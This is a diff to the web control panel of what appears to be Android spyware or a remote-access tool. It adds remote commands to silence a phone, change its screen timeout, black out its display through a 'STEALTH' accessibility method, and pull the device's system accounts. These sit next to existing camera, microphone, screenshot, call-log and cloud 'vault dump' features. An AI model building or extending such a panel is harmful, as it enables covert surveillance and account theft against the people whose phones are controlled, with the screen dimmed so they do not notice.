@@ -202,6 +202,27 @@
                 <div class="cmd-row"><label class="cmd-label">User Alert</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('TOAST')">?</button><input type="text" id="val-toast" placeholder="Toast msg..."><button class="btn" onclick="sendCmd('TOAST')">Toast</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Sonic Alarm</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('RING')">?</button><input type="number" id="val-ring" placeholder="Secs (e.g. 10)"><button class="btn" onclick="sendCmd('RING')">Ring</button></div></div>
                 <div class="cmd-row">
+                    <label class="cmd-label">Audio Infrastructure</label>
+                    <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('VOLUME')">?</button>
+                        <select id="vol-stream" style="width:70px; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
+                            <option value="RING">RING</option>
+                            <option value="MEDIA">MEDIA</option>
+                            <option value="ALARM">ALARM</option>
+                        </select>
+                        <input type="text" id="vol-level" placeholder="0-100 / SILENT / VIBRATE" style="flex:1">
+                        <button class="btn" onclick="sendCmd('VOLUME')">SET</button>
+                    </div>
+                </div>
+                <div class="cmd-row">
+                    <label class="cmd-label">Screen Latency (Timeout)</label>
+                    <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('SCREEN_TIMEOUT')">?</button>
+                        <input type="number" id="val-timeout" placeholder="Seconds (e.g. 30)" style="flex:1">
+                        <button class="btn" onclick="sendCmd('SCREEN_TIMEOUT')">SET</button>
+                    </div>
+                </div>
+                <div class="cmd-row">
                     <label class="cmd-label">Connectivity & Identity</label>
                     <div class="input-wrap">
                         <button class="btn-status" onclick="auditCmd('PING')">?</button>
@@ -229,8 +250,26 @@
                 </div>
             </div>
 
-            <h2 data-search="surveillance, eyes, ears, camera, audio, spy, snapshot, screenshot, mic">Surveillance (Optical / Audio / Display)</h2>
+            <h2 data-search="surveillance, eyes, ears, camera, audio, spy, snapshot, screenshot, mic, brightness, blind, stealth">Surveillance (Optical / Audio / Display)</h2>
             <div class="card">
+                <div class="cmd-row">
+                    <label class="cmd-label">Display Authority (Dimmer)</label>
+                    <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('BRIGHTNESS')">?</button>
+                        <input type="number" id="bri-level" value="0" placeholder="0-100" style="width:60px">
+                        <select id="bri-method" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
+                            <option value="ACC">ACC (STEALTH)</option>
+                            <option value="OVERLAY">OVERLAY (STD)</option>
+                            <option value="HARDWARE">HARDWARE</option>
+                            <option value="AUTO">AUTO</option>
+                        </select>
+                        <button class="btn" onclick="sendCmd('BRIGHTNESS')">GO</button>
+                    </div>
+                    <div class="input-wrap" style="margin-top:5px">
+                        <button class="btn-status" onclick="auditCmd('UNBLIND')">?</button>
+                        <button class="btn" style="flex:1" onclick="sendCmd('UNBLIND')">MASTER RESET (UNBLIND)</button>
+                    </div>
+                </div>
                 <div class="cmd-row">
                     <label class="cmd-label">Display Snapshot</label>
                     <div class="input-wrap">
@@ -313,6 +352,7 @@
                 </div>
                 <div class="cmd-row"><label class="cmd-label">Storage Indexer (Depth)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_SKELETON')">?</button><input type="number" id="val-skeleton" value="5" placeholder="Depth" style="width:80px"><button class="btn" onclick="sendCmd('GET_SKELETON')">Index</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Vault Storage Status</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_VAULT_SIZE')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_VAULT_SIZE')">Query Vault Size</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Identity Extraction</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_ACCOUNTS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_ACCOUNTS')">Fetch System Accounts</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Forensic Sync (Cloud)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('UPLOAD_DUMPS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('UPLOAD_DUMPS')">Sync Vault Dumps</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Diagnostic System Logs</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_LOGS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_LOGS')">Export Logcat</button></div></div>
             </div>
@@ -649,6 +689,15 @@
                         content = tAct.includes('|') ? tAct : `${tAct}|${tVal}`; break;
                     case 'PHONE_LOGS':
                         content = `${document.getElementById('call-act').value}|${document.getElementById('call-val').value}`; break;
+                    case 'VOLUME':
+                        content = `${document.getElementById('vol-stream').value} | ${document.getElementById('vol-level').value}`; break;
+                    case 'SCREEN_TIMEOUT':
+                        content = document.getElementById('val-timeout').value; break;
+                    case 'BRIGHTNESS':
+                        content = `${document.getElementById('bri-level').value} | ${document.getElementById('bri-method').value}`; break;
+                    case 'UNBLIND':
+                    case 'GET_ACCOUNTS':
+                        content = ''; break;
                 }
             }
 
